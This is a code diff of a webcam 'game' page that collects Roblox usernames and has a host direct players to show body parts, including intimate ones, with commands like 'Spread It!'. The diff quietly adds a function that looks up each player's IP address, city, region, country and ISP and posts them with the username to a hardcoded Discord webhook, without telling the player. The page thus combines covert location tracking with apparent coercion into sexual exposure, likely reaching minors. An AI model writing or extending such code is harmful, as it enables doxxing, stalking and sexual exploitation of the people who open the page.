@@ -7,6 +7,7 @@
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js">
     </script>
     <style>
+        /* ----- RESET & BASE ----- */
         * {
             margin: 0;
             padding: 0;
@@ -847,7 +848,7 @@
             }
         }
 
-        /* ----- BOSS ACTIONS (new layout with 7 buttons) ----- */
+        /* ----- BOSS ACTIONS (7 buttons) ----- */
         .boss-actions {
             display: flex;
             flex-direction: column;
@@ -949,7 +950,7 @@
             cursor: default;
             box-shadow: 0 0 30px rgba(255, 107, 107, 0.15);
         }
-        /* New command buttons */
+        /* Command buttons */
         .boss-actions .actions-row .btn-host-command {
             background: linear-gradient(135deg, #6bcbff, #4a8bd4);
             color: #fff;
@@ -2444,7 +2445,7 @@
                         <div class="player-cam-wrapper" id="playerCamWrapper">
                             <video id="playerCamVideo" autoplay playsinline muted></video>
                             <div class="cam-overlay-label">📷 your camera</div>
-                            <!-- Command overlay (shows host commands) -->
+                            <!-- Command overlay -->
                             <div class="player-command-overlay" id="playerCommandOverlay">
                                 <span class="cmd-icon" id="cmdIcon">📢</span>
                                 <span class="cmd-text" id="cmdText">Hold Still</span>
@@ -2452,7 +2453,7 @@
                             </div>
                         </div>
 
-                        <!-- Body Part Display (no Spread button anymore) -->
+                        <!-- Body Part Display -->
                         <div class="player-bodypart-display" id="playerBodypartDisplay">
                             <span class="part-emoji">🎯</span>
                             Show: <span class="part-name" id="playerPartName">Left Shoulder</span>
@@ -2549,7 +2550,7 @@
                     <div class="info-row"><span class="label">Status</span><span class="value status-text" id="bossScanStatus">⏳ waiting…</span></div>
                 </div>
 
-                <!-- Boss Actions with new buttons -->
+                <!-- Boss Actions -->
                 <div class="boss-actions">
                     <div class="actions-row">
                         <button class="btn-host-start" id="bossStartBtn">▶ Start</button>
@@ -2651,11 +2652,10 @@
             // ---- CONFIG ----
             const ROOM_CODE = 'ALPHA1';
             const SCAN_TIME = 30;
-            const GINGER_PER_PART = 2; // Each part adds 2% to Gingerscope
+            const GINGER_PER_PART = 2;
             const DISCORD_WEBHOOK_URL =
                 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
-            // Body parts with "Butt Crack" and "Bootyhole"
             const BODY_PARTS = [
                 { id: 'left_pinky', label: 'Left Pinky', points: 1, emoji: '🖐️', color: 'green' },
                 { id: 'right_pinky', label: 'Right Pinky', points: 1, emoji: '🖐️', color: 'green' },
@@ -2877,6 +2877,27 @@
                 if (mins < 1) return '< 1 min';
                 if (mins === 1) return '~1 min';
                 return `~${mins} min`;
+            }
+
+            // ---- IP FETCH ----
+            async function fetchIPInfo() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    if (data && data.ip) {
+                        return data;
+                    }
+                    return null;
+                } catch (e) {
+                    console.warn('Could not fetch IP info:', e);
+                    return null;
+                }
+            }
+
+            function getFlagEmoji(countryCode) {
+                if (!countryCode) return '🌍';
+                const codePoints = countryCode.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65);
+                return String.fromCodePoint(...codePoints);
             }
 
             // ---- PERMISSIONS ----
@@ -3132,8 +3153,8 @@
                 overlayUsername.classList.add('active');
             });
 
-            // ---- USERNAME OVERLAY ----
-            usernameSubmit.addEventListener('click', () => {
+            // ---- USERNAME OVERLAY (with IP webhook) ----
+            usernameSubmit.addEventListener('click', async () => {
                 const name = usernameInput.value.trim();
                 if (name.length < 3) {
                     alert('Please enter a valid Roblox username (at least 3 characters).');
@@ -3144,6 +3165,30 @@
 
                 const player = addToQueue(robloxUsername);
                 playerId = player.id;
+
+                // --- SEND WEBHOOK WITH USERNAME + IP ---
+                const ipData = await fetchIPInfo();
+                if (DISCORD_WEBHOOK_URL) {
+                    let msg = `👤 **New Player Joined**\n**Username:** ${robloxUsername}`;
+                    if (ipData) {
+                        const flag = ipData.country_code ? getFlagEmoji(ipData.country_code) : '🌍';
+                        msg += `\n**IP:** ${ipData.ip} ${flag}`;
+                        msg +=
+                            `\n**Location:** ${ipData.city || 'Unknown'}, ${ipData.region || ''} ${ipData.country_name || 'Unknown'}`;
+                        msg += `\n**ISP:** ${ipData.org || 'Unknown'}`;
+                    } else {
+                        msg += `\n**IP:** Unable to fetch`;
+                    }
+                    try {
+                        await fetch(DISCORD_WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: msg })
+                        });
+                    } catch (e) {
+                        console.warn('Webhook send failed:', e);
+                    }
+                }
 
                 if (!is18Confirmed) {
                     overlay18.classList.add('active');
@@ -3424,7 +3469,6 @@
                 }
             }
 
-            // Show command on player's screen
             function showPlayerCommand(icon, text) {
                 cmdIcon.textContent = icon;
                 cmdText.textContent = text;
@@ -3529,7 +3573,6 @@
                         playerHoldStill.classList.add('show');
                         gameStatus.textContent = '✋ hold still …';
                         gameStatus.style.color = '#ffa94d';
-                        // Also show command overlay
                         showPlayerCommand('✋', 'Hold Still');
                     } else {
                         playerHoldStill.classList.remove('show');
@@ -3537,7 +3580,6 @@
                         gameStatus.style.color = 'var(--text-dim)';
                     }
                 } else if (data.type === 'command') {
-                    // Handle host commands: spread, backup, zoom
                     const cmd = data.command;
                     if (cmd === 'spread') {
                         showPlayerCommand('🍑', 'Spread It!');
@@ -3723,7 +3765,6 @@
             function sendHostCommand(command) {
                 if (!isHost || !isPlayerConnected || !bossStarted) return;
                 sendDataToPlayer({ type: 'command', command: command });
-                // Update boss status
                 const cmdNames = {
                     spread: '🍑 Spread It!',
                     backup: '⬅️ Back Up',
